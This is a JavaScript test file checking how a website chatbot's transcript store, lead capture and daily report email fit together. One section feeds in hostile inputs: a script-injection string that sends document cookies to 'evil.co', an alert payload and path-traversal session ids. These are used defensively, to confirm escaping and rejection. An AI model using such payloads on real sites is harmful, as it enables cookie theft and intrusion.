/**
 * @file: functions/test/chatPipeline.test.js
 * @author: Stephen Boyett
 *
 * @description:
 *     Contract tests across the three modules that only meet in production: chatStore writes a
 *     transcript, chatLeads writes a prospect, and dailyReport reads BOTH back. Each module's own
 *     suite uses hand-made fixtures, so a renamed field would pass all of them and break the only
 *     email anyone reads. Everything here round-trips real writer output into the reader.
 *
 * @See Also:
 *     functions/lib/chatStore.js
 *     functions/lib/chatLeads.js
 *     functions/lib/dailyReport.js
 *
 * ---
 * @Copyright © 2026 Cannasol Technologies LLC. All Rights Reserved.
 * ---
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { createRequire } from 'node:module';

import {
  MAX_TURNS, COLLECTION, persistTranscript, createTranscriptRecorder, expiresAtFrom,
} from '../lib/chatStore.js';
import { LEADS_COLLECTION, persistLead, confirmLead } from '../lib/chatLeads.js';
import { collectReport, summariseReport, buildReportEmail, reportWindow } from '../lib/dailyReport.js';

const SID = 'session-pipeline01';
const T0 = new Date('2026-08-26T14:00:00.000Z');
const REPORT_AT = new Date('2026-08-26T20:00:00.000Z');
const at = (mins) => new Date(T0.getTime() + mins * 60000);

/** One fake standing in for both collections, with the getAll the report needs. */
function fakeDb(seed = {}) {
  const docs = new Map(Object.entries(seed));
  return {
    docs,
    transactions: 0,
    collection(name) {
      const db = this;
      return {
        doc: (id) => ({ path: `${name}/${id}` }),
        where(field, op, value) {
          return {
            get: async () => ({
              docs: [...docs.entries()]
                .filter(([path]) => path.startsWith(`${name}/`))
                .map(([, data]) => data)
                .filter((d) => {
                  const v = d[field];
                  const ms = v?.toDate ? v.toDate().getTime() : v?.getTime?.();
                  return op === '>=' ? ms >= value.getTime() : true;
                })
                .map((data) => ({ data: () => data })),
            }),
          };
        },
      };
    },
    async getAll(...refs) {
      return refs.map((r) => ({ exists: docs.has(r.path), data: () => docs.get(r.path) }));
    },
    async runTransaction(fn) {
      this.transactions += 1;
      return fn({
        get: async (ref) => ({ exists: docs.has(ref.path), data: () => docs.get(ref.path) }),
        set: (ref, data) => { docs.set(ref.path, data); },
      });
    },
  };
}

/** Drives one real chat turn through the recorder, exactly as index.js wires it. */
async function turn(db, { question, reply, leadFields = null, now, history = [] }) {
  const recorder = createTranscriptRecorder(() => {});
  const full = [...history, { role: 'user', text: question }];
  for (const chunk of reply.split(' ')) recorder.emit({ type: 'text', delta: `${chunk} ` });
  if (leadFields) recorder.emit({ type: 'lead_proposed', fields: leadFields });
  recorder.emit({ type: 'done' });

  await persistTranscript({ db, sessionId: SID, history: full, reply: recorder.reply(), page: '/mushrooms', now });
  const proposed = recorder.lead();
  if (proposed) await persistLead({ db, sessionId: SID, fields: proposed, page: '/mushrooms', now });

  return [...full, { role: 'model', text: recorder.reply() }];
}

describe('store → report contract', () => {
  it('renders a transcript the store actually wrote, not a fixture shaped like one', async () => {
    const db = fakeDb();
    await turn(db, { question: 'What particle size?', reply: 'About 18nm.', now: T0 });

    const report = await collectReport({ db, now: REPORT_AT });
    const mail = buildReportEmail(report);

    expect(report.conversations).toBe(1);
    expect(mail.text).toContain('What particle size?');
    expect(mail.text).toContain('About 18nm.');
    expect(mail.text).toContain('/mushrooms');
  });

  it('renders every lead field the lead store actually wrote', async () => {
    const db = fakeDb();
    await turn(db, {
      question: 'Send me samples', reply: 'On it.', now: T0,
      leadFields: {
        name: 'Jo Smith', company: 'Acme Beverages', email: 'jo@acme.co', phone: '216-555-0100',
        interest: 'nano kava emulsion', reason: 'Q3 seltzer',
        conversation_summary: 'Wants 18nm for a seltzer.',
      },
    });

    const mail = buildReportEmail(await collectReport({ db, now: REPORT_AT }));
    for (const value of ['Jo Smith', 'Acme Beverages', 'jo@acme.co', '216-555-0100', 'nano kava emulsion']) {
      expect(mail.text).toContain(value);
    }
  });

  it('distinguishes an extraction from a submission, end to end', async () => {
    const db = fakeDb();
    await turn(db, { question: 'samples please', reply: 'Sure.', now: T0, leadFields: { email: 'jo@acme.co' } });

    const before = buildReportEmail(await collectReport({ db, now: REPORT_AT }));
    expect(before.text).toMatch(/NOT submitted/);

    await confirmLead({ db, sessionId: SID, now: at(2) });

    const after = await collectReport({ db, now: REPORT_AT });
    expect(after.confirmedLeads).toBe(1);
    expect(after.extractedOnly).toBe(0);
    expect(buildReportEmail(after).text).toMatch(/SUBMITTED by the visitor/);
  });

  it('leaves a conversation that never produced a lead out of both counts', async () => {
    const db = fakeDb();
    await turn(db, { question: 'just browsing', reply: 'No problem.', now: T0 });
    const report = await collectReport({ db, now: REPORT_AT });
    expect(report.conversations).toBe(1);
    expect(report.confirmedLeads + report.extractedOnly).toBe(0);
    expect(buildReportEmail(report).text).toContain('no contact details captured');
  });

  it('excludes a conversation that started before the window', async () => {
    const db = fakeDb();
    await turn(db, { question: 'old chat', reply: 'old reply', now: new Date('2026-08-20T09:00:00.000Z') });
    expect((await collectReport({ db, now: REPORT_AT })).conversations).toBe(0);
  });

  it('includes a lead confirmed today against a chat that began yesterday-but-in-window', async () => {
    const db = fakeDb();
    await turn(db, { question: 'samples', reply: 'ok', now: at(5), leadFields: { email: 'a@b.co' } });
    await confirmLead({ db, sessionId: SID, now: at(300) });
    expect((await collectReport({ db, now: REPORT_AT })).confirmedLeads).toBe(1);
  });
});

describe('a long conversation, turn by turn', () => {
  it('holds the cap while turnCount keeps counting, and never moves the expiry', async () => {
    const db = fakeDb();
    let history = [];
    for (let i = 0; i < 50; i += 1) {
      history = await turn(db, { question: `q${i}`, reply: `a${i}`, now: at(i), history });
    }

    const doc = db.docs.get(`${COLLECTION}/${SID}`);
    expect(doc.messages).toHaveLength(MAX_TURNS);
    expect(doc.turnCount).toBeGreaterThan(MAX_TURNS);
    expect(doc.createdAt.getTime()).toBe(T0.getTime());
    expect(doc.expiresAt.getTime()).toBe(expiresAtFrom(T0).getTime());
    expect(doc.updatedAt.getTime()).toBe(at(49).getTime());
  });

  it('keeps the LATEST exchange and drops the oldest, with no duplicates', async () => {
    const db = fakeDb();
    let history = [];
    for (let i = 0; i < 50; i += 1) {
      history = await turn(db, { question: `q${i}`, reply: `a${i}`, now: at(i), history });
    }

    const texts = db.docs.get(`${COLLECTION}/${SID}`).messages.map((m) => m.text.trim());
    expect(texts.at(-2)).toBe('q49');
    expect(texts.at(-1)).toBe('a49');
    expect(texts).not.toContain('q0');
    expect(new Set(texts).size).toBe(texts.length);
  });

  it('still renders inside the daily report once capped', async () => {
    const db = fakeDb();
    let history = [];
    for (let i = 0; i < 40; i += 1) {
      history = await turn(db, { question: `q${i}`, reply: `a${i}`, now: at(i), history });
    }
    const mail = buildReportEmail(await collectReport({ db, now: REPORT_AT }));
    expect(mail.text).toContain('q39');
    expect(mail.subject).toMatch(/1 conversation/);
  });
});

describe('retention invariants', () => {
  it('every transcript carries an expiry the TTL policy can collect', async () => {
    const db = fakeDb();
    await turn(db, { question: 'hi', reply: 'hello', now: T0 });
    const doc = db.docs.get(`${COLLECTION}/${SID}`);
    expect(doc.expiresAt).toBeInstanceOf(Date);
    expect(doc.expiresAt.getTime() - doc.createdAt.getTime()).toBe(90 * 24 * 60 * 60 * 1000);
  });

  it('NO lead record ever gains an expiry, through any sequence', async () => {
    const db = fakeDb();
    await persistLead({ db, sessionId: SID, fields: { email: 'a@b.co' }, now: T0 });
    await confirmLead({ db, sessionId: SID, now: at(1) });
    await persistLead({ db, sessionId: SID, fields: { phone: '216-555-0100' }, now: at(2) });
    await confirmLead({ db, sessionId: SID, now: at(3) });

    const doc = db.docs.get(`${LEADS_COLLECTION}/${SID}`);
    expect(doc.expiresAt).toBeUndefined();
    expect(doc.ttl).toBeUndefined();
    expect(doc.confirmed).toBe(true);
    expect(doc.email).toBe('a@b.co');
    expect(doc.phone).toBe('216-555-0100');
  });

  it('reads and writes inside ONE transaction, so a racing turn cannot lose a message', async () => {
    const db = fakeDb();
    await turn(db, { question: 'hi', reply: 'hello', now: T0 });
    expect(db.transactions).toBe(1);
  });
});

describe('hostile input survives the whole pipeline', () => {
  const INJECTION = '<script>fetch("//evil.co?c="+document.cookie)</script>';

  it('never lets visitor text reach the report as live markup', async () => {
    const db = fakeDb();
    await turn(db, { question: INJECTION, reply: 'I can help with formulation questions.', now: T0 });

    const mail = buildReportEmail(await collectReport({ db, now: REPORT_AT }));
    expect(mail.html).not.toContain('<script>');
    expect(mail.html).toContain('&lt;script&gt;');
  });

  it('escapes an injected LEAD field too — the model composed it from visitor text', async () => {
    const db = fakeDb();
    await turn(db, {
      question: 'samples', reply: 'ok', now: T0,
      leadFields: { name: INJECTION, email: 'a@b.co', interest: '<b>bold</b>' },
    });

    const mail = buildReportEmail(await collectReport({ db, now: REPORT_AT }));
    expect(mail.html).not.toContain('<script>');
    expect(mail.html).not.toContain('<b>bold</b>');
    expect(mail.html).toContain('&lt;b&gt;bold&lt;/b&gt;');
  });

  it('escapes the page, which arrives from the client', async () => {
    const db = fakeDb();
    const recorder = createTranscriptRecorder(() => {});
    recorder.emit({ type: 'text', delta: 'hi' });
    await persistTranscript({
      db, sessionId: SID, history: [{ role: 'user', text: 'q' }],
      reply: 'hi', page: '"><script>alert(1)</script>', now: T0,
    });

    const mail = buildReportEmail(await collectReport({ db, now: REPORT_AT }));
    expect(mail.html).not.toContain('<script>alert(1)');
  });

  it('a prompt-injected turn cannot blow the per-message cap', async () => {
    const db = fakeDb();
    await persistTranscript({
      db, sessionId: SID, history: [{ role: 'user', text: 'x'.repeat(50000) }],
      reply: 'y'.repeat(50000), now: T0,
    });
    for (const m of db.docs.get(`${COLLECTION}/${SID}`).messages) {
      expect(m.text.length).toBeLessThanOrEqual(2000);
    }
  });

  it('a hostile session id never becomes a document path in either collection', async () => {
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    const db = fakeDb();
    for (const bad of ['../../admin', 'a/b', '__proto__', '..']) {
      await persistTranscript({ db, sessionId: bad, history: [{ role: 'user', text: 'x' }], reply: 'y' });
      await persistLead({ db, sessionId: bad, fields: { email: 'a@b.co' } });
      await confirmLead({ db, sessionId: bad });
    }
    expect(db.docs.size).toBe(0);
    vi.restoreAllMocks();
  });
});

describe('the report against real Firestore Timestamps', () => {
  it('sorts and renders conversations whose stamps came back as Timestamp, not Date', () => {
    const { Timestamp } = createRequire(import.meta.url)('firebase-admin/firestore');
    const mk = (id, mins) => ({
      sessionId: id, page: '/', turnCount: 2,
      createdAt: Timestamp.fromDate(at(mins)),
      messages: [{ role: 'user', text: `q from ${id}` }, { role: 'model', text: 'a' }],
    });

    const report = summariseReport({
      sessions: [mk('later', 30), mk('earlier', 5)],
      leads: [],
      window: reportWindow(REPORT_AT),
    });

    expect(report.rows.map((r) => r.sessionId)).toEqual(['earlier', 'later']);
    expect(buildReportEmail(report).text).toContain('q from earlier');
  });
});
